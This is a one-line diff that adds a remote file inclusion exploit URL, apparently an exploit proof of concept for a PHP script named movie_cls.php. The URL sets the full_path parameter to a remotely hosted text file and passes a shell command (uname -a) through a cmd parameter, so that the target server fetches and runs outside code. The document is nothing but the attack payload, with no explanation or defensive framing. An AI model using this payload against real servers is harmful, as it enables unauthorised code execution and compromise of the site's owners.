@@ -1,0 +1,1 @@
+http://www.example.com/[path]/movie_cls.php?full_path=http://www.example.com/x.txt?&amp;cmd=uname -a
